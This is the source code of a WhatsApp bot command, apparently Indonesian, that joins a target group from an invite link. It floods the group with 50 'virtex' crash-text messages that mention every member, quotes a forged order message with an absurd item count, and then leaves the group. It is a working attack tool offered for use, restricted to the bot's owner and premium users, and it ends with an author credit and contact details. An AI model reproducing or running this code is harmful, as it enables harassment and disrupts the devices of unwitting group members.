import virtex from '../virtex/index.js';
const isNumber = x => typeof x === 'number' && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function () {
    clearTimeout(this)
    resolve()
}, ms))

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
    if (!(isOwner || isPrems)) {
        global.dfail("premium", m, conn)
        throw false
    }
    if (!text) throw `Silahkan masukan link group target!\n\nContoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw `Link salah cok!\ncontoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
    try {
        m.reply('Sedang menyerang Gc.');
        let target = await conn.groupAcceptInvite(code)
        let member = (await conn.groupMetadata(target)).participants.map(v => v.id)
        let ftroli = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 9999999999999999999999999999999999999999999999999999999, status: 1, surface: 1, message: virtex, orderTitle: 'HAI KAKK', sellerJid: '0@s.whatsapp.net' } } }
        let namagc = (await conn.groupMetadata(target)).subject || '';
        let react = await conn.sendMessage(target, {
            react: {
                text: 'HALLO ðŸ‘‹',
                key: m.key
            }
        })
        for (let i = 50; i > 1; i--) {
            if (i !== 0) await conn.sendMessage(target, {
                text: virtex,
                mentions: await conn.parseMention(virtex),
                mentions: member
            }, { quoted: pickRandom([ftroli, react]) })
        }
        await delay(1500)
        await conn.groupLeave(target).catch((e) => {
            console.error(e)
            throw conn.groupLeave(target)
        })
        await conn.reply(m.chat, `Sukses mengirim virtex ke grup @${namagc}`, m)
    } catch (e) {
        console.error(e)
        throw e
    }
}

handler.help = ["seranggc", 'svigc'].map(v => v + ' <link>')
handler.tags = ['premium']
handler.command = /^s(erang|vi)?g(c|r(o|u)u?p)$/i

handler.premium = true

export default handler


function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}



/**
 * Jangan Di Hapus!!
 * 
 * Buatan @FokusDotId (Fokus ID)
 * Github: https://github.com/fokusdotid
 * 
 * Ingin bikin fitur tapi tidak bisa coding?
 * hubungi: https://wa.me/6281320170984
 * 
 */